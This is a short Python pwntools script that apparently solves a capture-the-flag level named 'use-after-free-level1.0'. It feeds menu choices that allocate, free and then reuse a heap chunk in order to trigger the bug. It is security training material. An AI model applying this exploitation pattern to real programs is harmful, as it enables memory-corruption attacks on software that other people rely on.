#!/usr/bin/python

import os
import pwn

def readlines(proc):
    try:
        line = proc.recvline(timeout=0.1)
        while (len(line) != 0):
            print(line.decode(), end='')
            line = proc.recvline(timeout=0.1)
    except:
        pass


proc = pwn.process("/challenge/use-after-free-level1.0")
readlines(proc)
proc.sendline(b'1')
readlines(proc)
proc.sendline(b'0')
readlines(proc)
proc.sendline(b'123')
readlines(proc)

proc.sendline(b'2')
readlines(proc)
proc.sendline(b'0')
readlines(proc)

proc.sendline(b'4')
readlines(proc)

proc.sendline(b'3')
readlines(proc)
proc.sendline(b'0')
readlines(proc)

proc.sendline(b'5')
readlines(proc)